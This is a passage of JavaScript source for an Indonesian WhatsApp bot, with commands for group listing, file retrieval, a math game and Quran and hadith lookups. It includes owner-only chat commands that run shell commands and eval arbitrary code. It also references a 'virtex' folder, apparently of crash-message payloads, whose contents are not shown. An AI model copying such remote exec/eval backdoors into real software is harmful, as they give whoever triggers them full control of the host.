 {buttonId: `${prefix}autolevel off`, buttonText: { displayText: Off },type: 1}], dev);
 }
 }
break;


case 'setbio':   
 {
if (!isOwner && !itsMe) return setReply("Khusus Owner")
if (!q) return setReply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await xdev.setStatus(q)
await setReply(`Berhasil mengganti status bio ke *${q}*`)
}
break


case 'speedtest': {
let cp = require('child_process')
let { promisify } = require('util')
let exec2 = promisify(cp.exec).bind(cp)
await setReply("_Testing Speed..._")
let o
try {
o = await exec2('python speed.py')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
if (stdout.trim()) setReply(stdout)
if (stderr.trim()) setReply(stderr)
}
}
break     

case 'listgc': {
if(!isOwner) return onlyOwner()
let getGroups = await xdev.groupFetchAllParticipating()
  //console.log(getGroups)
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata2 = await xdev.groupMetadata(i)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
 }
xdev.sendTextWithMentions(from, teks, dev)
}
break


case 'listpc': {
if(!isOwner) return onlyOwner()
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `◉ Nama : ${nama}\n◉ User : @${i.split('@')[0]}\n◉ Chat : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
xdev.sendTextWithMentions(from, teks, dev)
 }
break

//Exec
case '$':{
if (!itsMe && !isOwner) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
await setReply(`_${stdout}_`)
setReply("_Executing Finished_")
}
})
}
break

//Eval.code
case '>': {
if (!isOwner) return setReply(mess.only.owner)
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await setReply(evaled)
} catch (err) {
await setReply(String(err))
}
}
break

case '=>': {
if (!isOwner) return setReply(mess.only.owner)
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
if(sat){
var bang = util.format(sat)
} else if (sat == undefined) {
var  bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`(async () => { return ${q} })()`)))
} catch (e) {
setReply(String(e))
}
}
break

  case '+>':{
 if (!isOwner) return
try {
return setReply(`OutPut: 
${JSON.stringify(eval(budy.slice(2)),null,'\t')}
`)
} catch(err) {
e = String(err)
setReply(`"err" :  "${e}"`)
}
}
break

case 'sewa':{
let { dada } = require("../message/sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
xdev.sendButLoc(from, teks,copyright, fs.readFileSync('./stik/thumb.jpeg'), gbutsan)                          
}
break
			
case 'clearallUser':
if (!isOwner) return onlyOwner()
setReply("Suksek clear all User")
clearAllUser(user)
break 
			
case 'getfile':
try{
if (!isOwner && !dev.key.fromMe) return onlyOwner() 
if (!q) return setReply(`penggunaan\n${prefix+command} namafile\n${prefix+command} database\n${prefix+command} lib namafile\n${prefix+command} message namafile`)
if ((args[0]) === "index.js" || (args[0]) === "keepalive.js" || (args[0]) === "settings.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "package.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "README.md") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/md', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "replit.nix") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/nix', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "replit.nox") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/nox', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "speed.py") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/py', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === ".replit") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/replit', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "replit_zip_error_log.txt") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/txt', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "yarn-error.log") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/log', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "Procfile") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/Procfile', fileName: `${args[0]}` }, { quoted: dev })
} else if ((args[0]) === "assets" && (args[1]) === "style.css") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./assets/style.css`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/css', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "routers" && (args[1]) === "app-route.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./routers/app-route.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "views" && (args[1]) === "home.ejs") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./views/home.ejs`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/ejs', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "allcommand.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/allcommand.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "anonymous.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/anonymous.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "antispam.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/antispam.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "banned.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/banned.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "blockcmd.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/blockcmd.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "claim.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/claim.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "darah.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/darah.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "dashboard.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/dashboard.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "data.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/data.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "hasil_buruan.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/hasil_buruan.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "hitToday.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/hitToday.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "inventory.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/inventory.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "listerror.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/listerror.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "monay.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/monay.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "premium.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/premium.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "register.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/register.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "sewa.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/sewa.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "stick.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/stick.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "user.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/user.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "userblocked.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/userblocked.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "database" && (args[1]) === "vn.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/vn.json`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "alat_tukar.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/alat_tukar.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "antispam.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/antispam.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "antivirus.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/antivirus.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "banned.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/banned.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "blockcmd.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/blockcmd.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "blockuser.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/blockuser.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "buruan.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/buruan.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "cerpen.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/cerpen.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "color.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/color.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "convert.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/convert.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "converter.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/converter.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "darah.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/darah.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "exif.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/exif.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "functions.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/functions.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "monay.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/monay.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "myfunc.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/myfunc.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "pinterest.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/pinterest.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "premium.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/premium.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "register.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/register.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "scraper.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/scraper.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "sewa.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/sewa.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "simple.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/simple.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "totalcmd.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/totalcmd.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "totalerror.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/totalerror.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "uploader.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/uploader.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "lib" && (args[1]) === "user.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/user.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "group.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/group.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "help1.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/help1.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "help2.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/help2.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "help3.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/help3.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "mess.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/mess.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "message.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/message.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "msg.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/msg.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "sewabot.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/sewabot.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "stickerPack.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/stickerPack.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "message" && (args[1]) === "vn.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/vn.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "virtex" && (args[1]) === "ngazapv1.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/ngazapv1.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "virtex" && (args[1]) === "ngazapv2.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/ngazapv2.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "virtex" && (args[1]) === "ngazapv3.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/ngazapv3.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "virtex" && (args[1]) === "virtex.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/virtex.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "virtex" && (args[1]) === "virtex6.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/virtex6.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "virtex" && (args[1]) === "virtex7.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/virtex7.js`)
await xdev.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: dev })
} else if ((args[0]) === "media") {
setReply(`Terlalu banyak file kak`)
}
} catch(err){
console.log(err)
setReply(`${err}`)
}
break

case 'wallpaper': {
if (!q) return setReply( 'Masukkan Query Title')
let anu = await wallpaper(q)
if(anu.length == "0") return setReply("Image tidak di temukan")
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: copyright,
buttons: buttons,
headerType: 4
}
xdev.sendMessage(from, buttonMessage, { quoted: dev })
}
break

case 'math': {
	let modes = {
  noob: [-3, 3, -3, 3, '+-', 15000, 10],
  easy: [-10, 10, -10, 10, '*/+-', 20000, 40],
  medium: [-40, 40, -20, 20, '*/+-', 40000, 150],
  hard: [-100, 100, -70, 70, '*/+-', 60000, 350],
  extreme: [-999999, 999999, -999999, 999999, '*/', 99999, 9999],
  impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 35000],
  impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 30000, 50000]
}

let operators = {
  '+': '+',
  '-': '-',
  '*': '×',
  '/': '÷'
}

function genMath(mode) {
  let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
  let a = randomInt(a1, a2)
  let b = randomInt(b1, b2)
  let op = pickRandom([...ops])
  let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
  if (op == '/') [a, result] = [result, a]
  return {
    str: `${a} ${operators[op]} ${b}`,
    mode,
    time,
    bonus,
    result
  }
}

function randomInt(from, to) {
  if (from > to) [from, to] = [to, from]
  from = Math.floor(from)
  to = Math.floor(to)
  return Math.floor((to - from) * Math.random() + from)
}

	
	
	
	
	
 // xdev.math = xdev.math ? xdev.math : {}
  if (!q) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
  let mode = args[0].toLowerCase()
  if (!(mode in modes)) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
  let id = from
  if (id in xdev.math) return setReply('Masih ada soal belum terjawab di chat ini')
  let math2 = genMath(mode)
  xdev.math[id] = [
    await setReply(`Berapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: Rp${math2.bonus} `),
    math2, 4,
    setTimeout(async () => {
      //if (xdev.math[id]) await xdev.sendButton(from, `Waktu habis!\nJawabannya adalah ${math2.result}`, '', `${math2.mode.toUpperCase()}`, `.math ${math2.mode}`, conn.math[id][0])
        if (xdev.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
   delete xdev.math[id]
    }, math2.time)
  ]
}
break



case 'hadis': {
		if (!args[0]) return setReply( `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
		if (!args[1]) return setReply( `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`)
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		setReply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		setReply(`Hadis tidak ditemukan !`)
		}
		}
		break


case 'alquran': {
if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
xdev.sendMessage(from, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : dev })
}
break

case 'tafsirsurah': {
if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
}
break


 case 'react': {
//if (!isOwner) return setReply( mess.only.owner)
if(!q) return setReply(`Contoh ${prefix+command} 😝`)
let reactionMessage = {
react: {
text: args[0],
key: { remoteJid: from, fromMe: true, id: quoted.id }
}
}
xdev.sendMessage(from, reactionMessage)
}
break  

case  'setgif':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isVideo || isQuotedVideo){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./stik/video.mp4`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah thumbnail`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setgif`);
}
}
break


case 'setquoted':
    if(!isOwner) return onlyOwner()
    if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
        if(Qoted === "ftoko") return setReply("Udah aktif")
        Qoted = "ftoko"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftoko})
        } else if ((args[0]) === 'fkontak' ){
        if(Qoted === "fkontak") return setReply("Udah aktif")
        Qoted = "fkontak"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fkontak})
        } else if ((args[0]) === 'ftext'){
        if(Qoted === "ftext") return setReply("Udah aktif")
        Qoted = "ftext"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftext})
        } else if ((args[0]) === 'ftroli'){
        if(Qoted === "ftroli") return setReply("Udah aktif")
        Qoted = "ftroli"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftroli})
        }else if ((args[0]) === 'fsticker' ){
        if(Qoted === "fsticker") return setReply("Udah aktif")
        Qoted = "fsticker"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fsticker})
        } else if ((args[0]) === 'fvn'){
        if(Qoted === "fvn") return setReply("Udah aktif")
        Qoted = "fvn"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvn})
        } else if ((args[0]) === 'floc'){
        if(Qoted === "floc") return setReply("Udah aktif")
        Qoted = "floc"
        await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: floc})
        } else if ((args[0]) === 'fvideo' ){
        if(Qoted === "fvideo") return setReply("Udah aktif")
        Qoted = "fvideo"
